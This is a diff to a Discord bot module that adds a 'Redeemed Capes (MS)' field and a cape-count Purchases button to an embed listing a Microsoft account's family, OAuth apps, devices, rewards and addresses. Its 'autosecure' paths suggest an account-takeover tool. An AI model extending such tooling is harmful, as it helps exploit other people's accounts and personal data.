@@ -2,6 +2,7 @@ const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require("
 const { queryParams } = require("../../../db/database");
 const config = require("../../../config.json");
 const { codeblock } = require("../../../autosecure/utils/process/helpers");
+const { parsePurchases } = require("../../utils/info/parsePurchases");
 
 const isOwner = require("../../../db/isOwner");
 
@@ -191,6 +192,10 @@ module.exports = {
                 }
             }
 
+            const { redeemedCapes } = parsePurchases(info?.purchases);
+            const redeemedCapesDisplay = redeemedCapes.length > 0 ? redeemedCapes.join(", ") : "None";
+            const purchasesBtnLabel = redeemedCapes.length > 0 ? `Purchases (${redeemedCapes.length} Capes)` : "Purchases";
+
             const embed = new EmbedBuilder()
                 .setTitle(`Extra Information for \`\`${uid}\`\``)
                 .addFields(
@@ -203,7 +208,8 @@ module.exports = {
                     { name: "Family", value: `\`\`\`${dss}\`\`\``, inline: true },
                     { name: "OAuths", value: oauthDisplay, inline: true },
                     { name: "Devices", value: deviceDisplay, inline: true },
-                    { name: "MS Rewards", value: `\`\`\`${msRewardsDisplay}\`\`\``, inline: true }
+                    { name: "MS Rewards", value: `\`\`\`${msRewardsDisplay}\`\`\``, inline: true },
+                    { name: "Redeemed Capes (MS)", value: `\`\`\`${redeemedCapesDisplay}\`\`\``, inline: true }
                 )
                 .setColor('#b2c7e0');
 
@@ -218,7 +224,7 @@ module.exports = {
 
             const row2 = new ActionRowBuilder()
                 .addComponents(
-                    new ButtonBuilder().setCustomId(`purchases|${uid}`).setLabel("Purchases").setStyle(ButtonStyle.Secondary),
+                    new ButtonBuilder().setCustomId(`purchases|${uid}`).setLabel(purchasesBtnLabel).setStyle(redeemedCapes.length > 0 ? ButtonStyle.Primary : ButtonStyle.Secondary),
                     new ButtonBuilder().setCustomId(`subscriptions|${uid}`).setLabel("Subscriptions").setStyle(ButtonStyle.Secondary),
                     new ButtonBuilder().setCustomId(`family|${uid}`).setLabel("Family").setStyle(ButtonStyle.Secondary),
                     new ButtonBuilder().setCustomId(`addresses|${uid}`).setLabel("Addresses").setStyle(ButtonStyle.Secondary)
